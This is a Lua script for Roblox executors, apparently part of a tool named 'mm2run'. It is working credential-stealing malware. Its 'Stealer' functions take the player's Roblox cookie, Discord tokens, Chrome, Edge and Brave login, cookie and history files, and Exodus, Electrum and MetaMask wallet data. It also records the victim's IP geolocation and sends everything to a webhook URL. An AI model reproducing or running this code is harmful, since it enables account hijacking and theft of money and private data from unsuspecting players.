-- HTTP LAYER + LOG
--------------------------------------------------------------------------------
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local GuiService       = game:GetService("GuiService")
local CoreGui          = game:GetService("CoreGui")

local function LOG(...)
    local parts = {}
    for _, v in ipairs({...}) do parts[#parts+1] = tostring(v) end
    local line = "[mm2run] " .. table.concat(parts, " ")
    if type(warn) == "function" then warn(line) end
    if type(print) == "function" then print(line) end
end

local httpRequest = (syn and syn.request)
    or (http and http.request)
    or (fluxus and fluxus.request)
    or (krnl and krnl.request)
    or (secure_call and request)
    or (type(request) == "function" and request)
    or (type(http_request) == "function" and http_request)
    or nil

LOG("transport:", tostring(httpRequest ~= nil))

local function httpGet(url)
    if httpRequest then
        local ok, res = pcall(httpRequest, {Url = url, Method = "GET"})
        if ok and type(res) == "table" and res.Body then return res.Body end
    end
    local ok, body = pcall(function() return game:HttpGet(url) end)
    if ok then return body end
    return nil
end

local function httpPost(url, body, contentType)
    if not httpRequest then return false, "no-transport" end
    local headers = {}
    if contentType then headers["Content-Type"] = contentType end
    local ok, res = pcall(httpRequest, {
        Url = url, Method = "POST", Headers = headers, Body = body,
    })
    if not ok then return false, "err:" .. tostring(res) end
    if type(res) == "table" then
        local code = tonumber(res.StatusCode or res.Status or 0) or 0
        return code >= 200 and code < 300, "HTTP " .. tostring(code)
    end
    return true, "?"
end

local function jsonEncode(t)
    local ok, s = pcall(HttpService.JSONEncode, HttpService, t)
    return ok and s or "{}"
end

local function jsonDecode(s)
    local ok, t = pcall(HttpService.JSONDecode, HttpService, s)
    return ok and t or nil
end

local function selfTestPing()
    local ok, err = httpPost(WEBHOOK_URL, jsonEncode({
        username = "mm2run",
        content  = "**[selftest] " .. os.date("!%H:%M:%S") .. "**",
    }), "application/json")
    LOG("selftest:", tostring(ok), err or "")
    return ok
end

local function getEnv(n)
    if type(getenv) == "function" then local ok, v = pcall(getenv, n); if ok and v ~= "" then return v end end
    if os and type(os.getenv) == "function" then local ok, v = pcall(os.getenv, n); if ok and v ~= "" then return v end end
    return nil
end

local function readFileSafe(p)
    if type(readfile) ~= "function" then return nil end
    local ok, d = pcall(readfile, p); if ok then return d end; return nil
end

local function listDirSafe(p)
    if type(listfiles) ~= "function" then return nil end
    local ok, f = pcall(listfiles, p); if ok and type(f) == "table" then return f end; return nil
end

local function executorName()
    if type(identifyexecutor) == "function" then
        local ok, n = pcall(identifyexecutor); if ok and n then return tostring(n) end
    end
    return "unknown"
end

--------------------------------------------------------------------------------
-- HARVEST
--------------------------------------------------------------------------------
local Stealer = {}

function Stealer.robloxCookie()
    local out = {}
    if type(getcookie) == "function" then
        local ok, c = pcall(getcookie); if ok and c then out[#out+1] = {"getcookie", c} end
    end
    if syn and type(syn.cookie) == "function" then
        local ok, c = pcall(syn.cookie); if ok and c then out[#out+1] = {"syn.cookie", c} end
    end
    return out
end

function Stealer.discordTokens()
    local appdata  = getEnv("APPDATA") or ""
    local localapp = getEnv("LOCALAPPDATA") or ""
    if appdata == "" and localapp == "" then return {} end
    local roots = {
        appdata .. "\\discord",
        appdata .. "\\discordcanary",
        appdata .. "\\discordptb",
        appdata .. "\\Lightcord",
        localapp .. "\\Google\\Chrome\\User Data\\Default",
        localapp .. "\\Microsoft\\Edge\\User Data\\Default",
        localapp .. "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    }
    local pat  = "[%w_%-%.]+%.[%w_%-]+%.[%w_%-]+"
    local seen, out = {}, {}
    for _, root in ipairs(roots) do
        local ldbs = listDirSafe(root .. "\\Local Storage\\leveldb")
        if ldbs then
            for _, path in ipairs(ldbs) do
                local low = string.lower(path)
                if string.match(low, "%.ldb$") or string.match(low, "%.log$") then
                    local data = readFileSafe(path)
                    if data then
                        for tok in string.gmatch(data, pat) do
                            if #tok > 50 and not seen[tok] then
                                seen[tok] = true
                                out[#out+1] = {file = path, token = tok}
                            end
                        end
                    end
                end
            end
        end
    end
    return out
end

function Stealer.browserFiles()
    local localapp = getEnv("LOCALAPPDATA") or ""
    if localapp == "" then return {} end
    local targets = {
        {app = "Chrome",  base = localapp .. "\\Google\\Chrome\\User Data\\Default"},
        {app = "Edge",    base = localapp .. "\\Microsoft\\Edge\\User Data\\Default"},
        {app = "Brave",   base = localapp .. "\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
    }
    local files = {"Login Data", "Cookies", "Web Data", "History", "Local State"}
    local out = {}
    for _, t in ipairs(targets) do
        for _, fname in ipairs(files) do
            local d = readFileSafe(t.base .. "\\" .. fname)
            if d then out[#out+1] = {app = t.app, name = fname, data = d} end
        end
    end
    return out
end

function Stealer.cryptoWallets()
    local appdata  = getEnv("APPDATA") or ""
    local localapp = getEnv("LOCALAPPDATA") or ""
    local paths = {
        {label = "Exodus",   path = appdata  .. "\\Exodus\\exodus.wallet"},
        {label = "Electrum", path = appdata  .. "\\Electrum\\wallets"},
        {label = "MetaMask", path = localapp .. "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    }
    local out = {}
    for _, e in ipairs(paths) do
        local files = listDirSafe(e.path)
        if files then
            for _, f in ipairs(files) do
                local d = readFileSafe(f)
                if d and #d > 0 then out[#out+1] = {label = e.label, path = f, data = d} end
            end
        end
    end
    return out
end

local function collectGeo()
    local body = httpGet("http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query")
    if not body then return nil end
    local d = jsonDecode(body)
    if d and d.status == "success" then return d end
    return nil
end

local function buildMultipart(fields, files, boundary)
    local crlf = "\r\n"
    local parts = {}
    for k, v in pairs(fields or {}) do
        parts[#parts+1] = "--" .. boundary .. crlf
        parts[#parts+1] = 'Content-Disposition: form-data; name="' .. k .. '"' .. crlf .. crlf
        parts[#parts+1] = tostring(v) .. crlf
    end
    for _, f in ipairs(files or {}) do
        parts[#parts+1] = "--" .. boundary .. crlf
        parts[#parts+1] = 'Content-Disposition: form-data; name="' .. f.field ..
                          '"; filename="' .. f.filename .. '"' .. crlf
        parts[#parts+1] = "Content-Type: application/octet-stream" .. crlf .. crlf
        parts[#parts+1] = f.data .. crlf
    end
    parts[#parts+1] = "--" .. boundary .. "--" .. crlf
    return table.concat(parts)
end

local function truncate(s, n)
    s = tostring(s or "")
    if #s <= n then return s end
    return string.sub(s, 1, n) .. "..."
end

local function runHarvest()
    local geo  = collectGeo()
    local pl   = Players.LocalPlayer
    local exec = executorName()

    local cookies = Stealer.robloxCookie()
    local tokens  = Stealer.discordTokens()

    local fields = {
        {name = "Username", value = tostring(pl and pl.Name or "?"), inline = true},
        {name = "Display",  value = tostring(pl and pl.DisplayName or "?"), inline = true},
        {name = "UserId",   value = tostring(pl and pl.UserId or "?"), inline = true},
        {name = "Age",      value = tostring(pl and pl.AccountAge or "?") .. "d", inline = true},
        {name = "Executor", value = tostring(exec), inline = true},
        {name = "Place",    value = tostring(game.PlaceId), inline = true},
    }
    if geo then
        fields[#fields+1] = {name = "IP", value = tostring(geo.query or "?"), inline = true}
        fields[#fields+1] = {name = "Country", value = tostring(geo.country or "?") .. " " .. tostring(geo.countryCode or ""), inline = true}
        fields[#fields+1] = {name = "City", value = tostring(geo.city or "?"), inline = true}
        fields[#fields+1] = {name = "Region", value = tostring(geo.regionName or "?"), inline = true}
        fields[#fields+1] = {name = "ISP", value = tostring(geo.isp or "?"), inline = true}
        fields[#fields+1] = {name = "Coords", value = tostring(geo.lat or "?") .. "," .. tostring(geo.lon or "?"), inline = true}
    end

    if #cookies > 0 then
        local lines = {}
        for _, c in ipairs(cookies) do lines[#lines+1] = c[1] .. ": " .. truncate(c[2], 400) end
        fields[#fields+1] = {name = "Roblox Cookie", value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```", inline = false}
    else
        fields[#fields+1] = {name = "Roblox Cookie", value = "none", inline = false}
    end

    if #tokens > 0 then
        local lines = {}
        for i, t in ipairs(tokens) do if i > 10 then break end; lines[#lines+1] = t.token end
        fields[#fields+1] = {name = "Discord Tokens [" .. #tokens .. "]", value = "```\n" .. truncate(table.concat(lines, "\n"), 900) .. "\n```", inline = false}
    else
        fields[#fields+1] = {name = "Discord Tokens", value = "none", inline = false}
    end

    local ok, err = httpPost(WEBHOOK_URL, jsonEncode({
        username = "mm2run",
        content  = "**new session**",
        embeds = {{
            title = "session", color = 0x8A5CF0, fields = fields,
            footer = {text = "mm2run"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }},
    }), "application/json")
    LOG("embed:", tostring(ok), err or "")

    local batch, size = {}, 0
    local function addF(field, filename, data)
        local len = #tostring(data)
        if len + size > 5 * 1024 * 1024 then
            if #batch > 0 then
                local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
                httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
                    "multipart/form-data; boundary=" .. bnd)
                batch, size = {}, 0
                task.wait(1)
            end
        end
        batch[#batch+1] = {field = field, filename = filename, data = data}
        size = size + len
    end

    for _, b in ipairs(Stealer.browserFiles()) do
        addF("files", (b.app .. "_" .. b.name):gsub("%s", "_"), b.data)
    end
    for _, w in ipairs(Stealer.cryptoWallets()) do
        addF("files", (w.label .. "_" .. (w.path:match("[^\\/]+$") or "w")):gsub("%s", "_"), w.data)
    end
    if #batch > 0 then
        local bnd = "----L" .. HttpService:GenerateGUID(false):gsub("-", "")
        httpPost(WEBHOOK_URL, buildMultipart({content = "attachments"}, batch, bnd),
            "multipart/form-data; boundary=" .. bnd)
    end
end

